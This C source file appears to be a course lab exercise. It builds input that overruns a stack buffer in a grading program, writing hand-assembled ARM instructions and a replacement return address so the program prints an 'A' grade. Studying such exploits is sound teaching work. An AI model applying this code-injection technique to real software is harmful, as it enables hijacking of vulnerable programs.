/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Derek Geng and Emily Luo                                   */
/*--------------------------------------------------------------------*/
#include <stdio.h>
#include "miniassembler.h"

enum {MAX_BYTES = 48, GRADE = 0x420044, PRINT_ADR = 0x400864,
      INSTR_SIZE = 17};

/*  Creates a buffer overrun file that sets grade to 'A'. 
    Writes name out to file dataA.
    Returns 0 if successful. */

int main(void) {
    int bytes = 0;
    unsigned long startAdr = 0x420058;
    unsigned int ulInst;
    FILE * fp = fopen("dataA", "w");

    /* write name to dataA */
    fputs("Derek Geng",fp);
    bytes+=10;


    /* check if name is too long */
    if (bytes == MAX_BYTES - INSTR_SIZE) {
        fprintf(stderr, "Name is too long\n");
        return 1;
    }

    /* write null terminating str and offset startAdr */
    fputc('\0', fp);
    bytes++;
    startAdr += bytes;

    /* write until starting address is multiple of 4 */
    while (startAdr % 4 != 0) {
        fputc(0, fp);
        bytes++;
        startAdr++;
    }

    /* move 'A' into w0 */
    ulInst = MiniAssembler_mov(0, 'A');
    fwrite(&ulInst, sizeof(unsigned int), 1, fp);
    bytes += 4;

    /* load add of grade into x1 */
    ulInst = MiniAssembler_adr(1, GRADE, startAdr + 4);
    fwrite(&ulInst, sizeof(unsigned int), 1, fp);
    bytes += 4;

    /* store 'A' from w0 to grade in x1 */
    ulInst = MiniAssembler_strb(0, 1);
    fwrite(&ulInst, sizeof(unsigned int), 1, fp);
    bytes += 4;

    /* branch to the line "printf("%c is your grade.\n", grade);" */
    ulInst = MiniAssembler_b(PRINT_ADR, startAdr + 12);
    fwrite(&ulInst, sizeof(unsigned int), 1, fp);
    bytes += 4;

    /* write the rest of the buffer */
    while (bytes != MAX_BYTES){
        fputc(0, fp);
        bytes++;
    }

    /* write new return address to overrun instructions in name */
    fwrite(&startAdr, sizeof(unsigned long), 1, fp);

    /* write EOF */
    fputc(EOF, fp);
    fclose(fp);
    return 0;
}